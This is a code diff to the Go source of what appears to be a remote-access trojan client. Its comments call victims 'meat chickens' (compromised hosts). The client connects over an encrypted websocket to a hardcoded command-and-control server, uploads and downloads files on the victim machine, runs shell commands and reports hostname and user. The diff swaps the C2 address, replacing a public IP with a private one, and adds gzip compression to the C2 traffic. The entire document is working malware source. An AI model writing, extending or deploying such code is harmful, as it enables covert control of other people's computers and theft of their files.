@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"compress/gzip"
 	"encoding/base64"
 	"encoding/json"
 	"errors"
@@ -38,9 +39,7 @@ const (
 var (
 	s_lock int
 	m      *filemutex.FileMutex
-	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
-	//baseUrl = "124.156.100.149:8080"
-	baseUrl      = "106.54.242.217"
+	baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
 	conn         *websocket.Conn
 	origin       = "http://" + baseUrl + "/"
 	url          = "ws://" + baseUrl + "/hfuiefdhuiwe32uhi"
@@ -58,11 +57,13 @@ type Message struct {
 	Name      string `json:"name"`
 	Msg       string `json:"msg"`
 
+	ByteData []byte `json:"byteData"` //截屏,文件，等等大的数据
 	FileName string `json:"fileName"`
-	FileBody string `json:"fileBody"`
+	//FileBody string `json:"fileBody"`
 }
 
 type Host struct {
+	Terrace  string `json:"terrace"` //平台
 	Hostname string `json:"hostname"`
 	Whoami   string `json:"whoami"`
 }
@@ -121,24 +122,19 @@ func main() {
 				msgs <- message
 			} else if reqM.Name == UPLOAD_FILE { //上传文件到肉鸡
 				message.Name = SEND_MSG
-				fileBytes, err := base64.StdEncoding.DecodeString(reqM.FileBody) //base64 dec
+				file, err := os.Create(reqM.FileName) //创建文件
 				if err != nil {
 					message.Msg = "upload " + reqM.FileName + " error " + err.Error()
 				} else {
-					file, err := os.Create(reqM.FileName) //创建文件
+					_, err = file.Write(reqM.ByteData) //写入文件
 					if err != nil {
 						message.Msg = "upload " + reqM.FileName + " error " + err.Error()
 					} else {
-						_, err = file.Write(fileBytes) //写入文件
-						if err != nil {
-							message.Msg = "upload " + reqM.FileName + " error " + err.Error()
-						} else {
-							message.Msg = "upload " + reqM.FileName + " OK!"
-						}
+						message.Msg = "upload " + reqM.FileName + " OK!"
 					}
-					if file != nil {
-						file.Close()
-					}
+				}
+				if file != nil {
+					file.Close()
 				}
 				msgs <- message
 			} else if reqM.Name == DOWNLOAD_FILE { //下载文件到控制台
@@ -149,11 +145,11 @@ func main() {
 					msgs <- message
 				} else if len(fileByts) > 0 {
 					message.Name = DOWNLOAD_FILE
-					file64Str := base64.StdEncoding.EncodeToString(fileByts) //base64
+					//file64Str := base64.StdEncoding.EncodeToString(fileByts) //base64
 					strs := strings.Split(reqM.Msg, "/")
 					fileNeme := strs[len(strs)-1]
 					message.FileName = fileNeme
-					message.FileBody = file64Str
+					message.ByteData = fileByts
 					msgs <- message
 				}
 			} else if reqM.Name == SLEEP_ROUSE { //设置休眠
@@ -201,7 +197,7 @@ wait:
 			if whoami == "" {
 				whoami, _ = execShell("whoami")
 			}
-			host := Host{Hostname: hostname, Whoami: whoami}
+			host := Host{Hostname: hostname, Whoami: whoami, Terrace: terrace}
 			hostJsonBytes, _ := json.Marshal(host) //结构体转json
 			message.Msg = string(hostJsonBytes)
 			//now := time.Now().Format("2006-01-02 15:04:05")
@@ -224,6 +220,7 @@ wait:
 	}
 }
 
+//读取数据
 func readMessage(conn *websocket.Conn) ([]byte, error) {
 again:
 	fr, err := conn.NewFrameReader()
@@ -242,13 +239,15 @@ again:
 	if err != nil {
 		return reqBytes, err
 	}
-	reqBytes = encDec(reqBytes) //解密数据
+	reqBytes = encDec(reqBytes)      //解密数据
+	reqBytes = UnGzipBytes(reqBytes) //解压数据
 	return reqBytes, nil
 }
 
 //发送websocket消息
 func sendMessage(message Message) error {
 	jsonBytes, _ := json.Marshal(message) //结构体转json
+	jsonBytes = gzipBytes(jsonBytes)      //压缩结构体
 	jsonBytes = encDec(jsonBytes)         //加密
 	if conn != nil {
 		_, err := conn.Write(jsonBytes) //发送消息
@@ -256,6 +255,32 @@ func sendMessage(message Message) error {
 	} else {
 		return errors.New("conn is null pointer")
 	}
+}
+
+//gzip压缩
+func gzipBytes(byt []byte) []byte {
+	var buf bytes.Buffer
+	//zw := gzip.NewWriter(&buf)
+	zw, _ := gzip.NewWriterLevel(&buf, gzip.BestCompression)
+
+	zw.Write(byt)
+	if err := zw.Close(); err != nil {
+	}
+	return buf.Bytes()
+}
+
+//gzip解压缩
+func UnGzipBytes(byt []byte) []byte {
+	var buf bytes.Buffer
+	buf.Write(byt)
+	zr, _ := gzip.NewReader(&buf)
+	defer func() {
+		if zr != nil {
+			zr.Close()
+		}
+	}()
+	a, _ := ioutil.ReadAll(zr)
+	return a
 }
 func json2Message(strByte []byte) (Message, error) {
 	var dat Message
